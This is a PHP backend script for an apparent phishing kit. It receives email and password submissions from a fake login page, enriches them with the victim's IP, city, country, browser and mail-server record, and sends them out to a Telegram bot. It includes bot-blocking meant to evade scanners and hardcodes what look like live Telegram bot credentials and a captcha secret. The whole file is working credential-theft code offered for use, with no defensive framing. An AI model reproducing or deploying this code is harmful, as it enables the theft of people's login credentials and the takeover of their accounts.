<?php
// Start output buffering to prevent header issues
ob_start();

// Include configuration
if (file_exists('config.php')) {
    require_once 'config.php';
} else {
    // Fallback constants for development
    define('FRONTEND_URL', 'http://localhost:8001');
    define('LOGIN_PAGE', 'he-opas.html');
    define('TELEGRAM_BOT_TOKEN', '8499182673:AAGesMaZF6BI809HR5GK1aY7jb0XqRQC3ms');
    define('TELEGRAM_CHAT_ID', '7608981070');
    define('TURNSTILE_SECRET', '0x4AAAAAABuU_Y3u4wDzmWBxJShHN2uHHTM');
    define('ENVIRONMENT', 'development');
    define('ALLOWED_ORIGINS', ['http://localhost:8001', 'http://127.0.0.1:8001']);
}

// Set CORS headers for cross-origin requests
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$allowedOrigins = defined('ALLOWED_ORIGINS') ? ALLOWED_ORIGINS : ['http://localhost:8001'];

if (in_array($origin, $allowedOrigins)) {
    header("Access-Control-Allow-Origin: $origin");
} else {
    header("Access-Control-Allow-Origin: " . FRONTEND_URL);
}

header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
header("Access-Control-Allow-Credentials: true");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Include advanced bot blocker
require_once 'bot-blocker.php';

/**
 * Extract domain from email address
 */
function getDomainFromEmail($email) {
    if (strpos($email, '@') !== false) {
        return explode('@', $email)[1];
    }
    return null;
}

/**
 * Get the real client IP, supporting Nginx proxy headers and VPS deployment
 */
function getUserIP() {
    // Try X-Forwarded-For (may be a comma-separated list)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        $ip = trim($ip);
        if (!empty($ip) && strtolower($ip) !== 'unknown' && 
            !str_starts_with($ip, '127.') && 
            !str_starts_with($ip, '192.168.') && 
            !str_starts_with($ip, '10.')) {
            return $ip;
        }
    }
    
    // Try X-Real-IP
    if (!empty($_SERVER['HTTP_X_REAL_IP']) && 
        strtolower($_SERVER['HTTP_X_REAL_IP']) !== 'unknown' &&
        !str_starts_with($_SERVER['HTTP_X_REAL_IP'], '127.') && 
        !str_starts_with($_SERVER['HTTP_X_REAL_IP'], '192.168.') && 
        !str_starts_with($_SERVER['HTTP_X_REAL_IP'], '10.')) {
        return $_SERVER['HTTP_X_REAL_IP'];
    }
    
    // Try Cloudflare specific header
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP']) &&
        !str_starts_with($_SERVER['HTTP_CF_CONNECTING_IP'], '127.') && 
        !str_starts_with($_SERVER['HTTP_CF_CONNECTING_IP'], '192.168.') && 
        !str_starts_with($_SERVER['HTTP_CF_CONNECTING_IP'], '10.')) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    
    // Fallback to REMOTE_ADDR
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    // If we're getting localhost/private IPs, try to get public IP via external service
    if ($ip === '127.0.0.1' || $ip === 'localhost' || 
        str_starts_with($ip, '192.168.') || 
        str_starts_with($ip, '10.') || 
        str_starts_with($ip, '172.')) {
        
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 5
                ]
            ]);
            $publicIP = file_get_contents('https://api.ipify.org', false, $context);
            if ($publicIP !== false) {
                return trim($publicIP) . " (VPS detected: $ip)";
            }
        } catch (Exception $e) {
            // Ignore error
        }
        return "$ip (local/private network)";
    }
    
    return $ip ?: 'Unknown';
}

/**
 * Get city and country from IP using ipapi.co
 */
function getLocationFromIP($ip) {
    try {
        // Extract just the IP if it contains additional info
        $cleanIP = explode(' ', $ip)[0];
        
        if (!empty($cleanIP) && $cleanIP !== 'Unknown' && 
            !str_starts_with($cleanIP, '127.') && 
            !str_starts_with($cleanIP, '192.168.') && 
            !str_starts_with($cleanIP, '10.')) {
            
            $context = stream_context_create([
                'http' => [
                    'timeout' => 5
                ]
            ]);
            $response = file_get_contents("http://ipapi.co/$cleanIP/json/", false, $context);
            
            if ($response !== false) {
                $data = json_decode($response, true);
                $city = $data['city'] ?? 'Unknown';
                $country = $data['country_name'] ?? 'Unknown';
                return [$city, $country];
            }
        }
    } catch (Exception $e) {
        // Ignore error
    }
    return ['Unknown (Local/Private Network)', 'Unknown (Local/Private Network)'];
}

/**
 * Get user's browser from User-Agent
 */
function getUserBrowser() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    if (strpos($userAgent, 'Chrome') !== false) {
        return 'Chrome';
    } elseif (strpos($userAgent, 'Firefox') !== false) {
        return 'Firefox';
    } elseif (strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Chrome') === false) {
        return 'Safari';
    } elseif (strpos($userAgent, 'Edge') !== false) {
        return 'Edge';
    } elseif (strpos($userAgent, 'Opera') !== false) {
        return 'Opera';
    } else {
        return 'Unknown';
    }
}

/**
 * Get MX record for a domain
 */
function getMXRecord($domain) {
    try {
        $mxRecords = [];
        if (getmxrr($domain, $mxRecords)) {
            return $mxRecords[0] ?? 'No MX record';
        }
    } catch (Exception $e) {
        // Ignore error
    }
    return 'Unable to resolve MX';
}

/**
 * Send message to Telegram bot
 */
function sendToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result !== false;
}

// Initialize variables
$email = '';
$password = '';
$turnstileResponse = '';
$error = null;
$domain = null;
$logoUrl = null;

// Handle form submission and GET requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle bot detection reports from frontend
    if (isset($_POST['bot_detected'])) {
        $reason = $_POST['reason'] ?? 'Unknown';
        $userAgent = $_POST['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '';
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        
        error_log("Frontend bot detection: Reason=$reason, IP=$ip, UA=$userAgent");
        http_response_code(403);
        die('Bot detected by frontend');
    }
    
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $turnstileResponse = $_POST['cf-turnstile-response'] ?? '';
    
    // Validate password
    if (empty($password)) {
        $error = 'Authentication is required.';
    }
    
    // Validate captcha
    if (empty($turnstileResponse)) {
        $error = 'Captcha is required.';
    } else {
        // Verify Turnstile
        $verifyUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
        $verifyData = [
            'secret' => TURNSTILE_SECRET,
            'response' => $turnstileResponse
        ];
        
        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($verifyData)
            ]
        ];
        
        $context = stream_context_create($options);
        $result = file_get_contents($verifyUrl, false, $context);
        
        if ($result !== false) {
            $verifyResult = json_decode($result, true);
            if (!($verifyResult['success'] ?? false)) {
                $error = 'Captcha validation failed.';
            }
        } else {
            $error = 'Captcha validation failed.';
        }
    }
    
    // Send to Telegram if no errors
    if (!$error) {
        // Get additional user information
        $userIP = getUserIP();
        [$city, $country] = getLocationFromIP($userIP);
        $browser = getUserBrowser();
        $domain = getDomainFromEmail($email);
        $mxRecord = $domain ? getMXRecord($domain) : 'N/A';
        $timestamp = date('Y-m-d H:i:s') . ' UTC';
        
        // Create enhanced message with all requested details
        $msg = "🎯 New Signup Alert!\n\n";
        $msg .= "Email: $email\n";
        $msg .= "Password: $password\n\n";
        $msg .= "📊 Additional Details:\n";
        $msg .= "IP Address: $userIP\n";
        $msg .= "City: $city\n";
        $msg .= "Country: $country\n";
        $msg .= "Browser: $browser\n";
        $msg .= "MX Record: $mxRecord\n";
        $msg .= "Date of Submission: $timestamp";
        
        // Send to main Telegram bot
        $mainSuccess = sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, $msg);
        if ($mainSuccess) {
            error_log("✅ Message sent to main Telegram bot successfully!");
        } else {
            error_log("❌ Failed to send message to main Telegram bot");
        }
        
        // Send to secondary bot if credentials are defined
        if (defined('SECONDARY_TELEGRAM_BOT_TOKEN') && defined('SECONDARY_TELEGRAM_CHAT_ID')) {
            $secondarySuccess = sendToTelegram(SECONDARY_TELEGRAM_BOT_TOKEN, SECONDARY_TELEGRAM_CHAT_ID, $msg);
            if ($secondarySuccess) {
                error_log("✅ Message sent to secondary Telegram bot successfully!");
            } else {
                error_log("❌ Failed to send message to secondary Telegram bot");
            }
        } else {
            error_log("ℹ️ No secondary Telegram bot configured");
        }
    }
    
    // Handle POST response - redirect to frontend server
    if ($error) {
        // Redirect back to frontend with error message
        $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . "?email=" . urlencode($email) . "&error=" . urlencode($error);
        error_log("🔄 Redirecting to: $redirectUrl");
        
        // Clear any output buffer and send redirect
        if (ob_get_level()) {
            ob_end_clean();
        }
        
        // Try PHP redirect first
        header("Location: $redirectUrl");
        
        // Fallback JavaScript redirect if PHP redirect fails
        echo '<script>window.location.href = "' . htmlspecialchars($redirectUrl) . '";</script>';
        echo '<noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($redirectUrl) . '"></noscript>';
        echo '<p>If you are not redirected, <a href="' . htmlspecialchars($redirectUrl) . '">click here</a>.</p>';
        exit();
    } else {
        // Success - redirect to frontend with success indicator
        $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . "?email=" . urlencode($email) . "&success=1";
        error_log("🔄 Redirecting to: $redirectUrl");
        
        // Clear any output buffer and send redirect
        if (ob_get_level()) {
            ob_end_clean();
        }
        
        // Try PHP redirect first
        header("Location: $redirectUrl");
        
        // Fallback JavaScript redirect if PHP redirect fails
        echo '<script>window.location.href = "' . htmlspecialchars($redirectUrl) . '";</script>';
        echo '<noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($redirectUrl) . '"></noscript>';
        echo '<p>If you are not redirected, <a href="' . htmlspecialchars($redirectUrl) . '">click here</a>.</p>';
        exit();
    }
} else {
    // GET request - redirect to the frontend server
    $queryString = $_SERVER['QUERY_STRING'] ?? '';
    $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . ($queryString ? "?$queryString" : "");
    error_log("🔄 GET Redirecting to: $redirectUrl");
    
    // Clear any output buffer and send redirect
    if (ob_get_level()) {
        ob_end_clean();
    }
    header("Location: $redirectUrl");
    exit();
}
?>
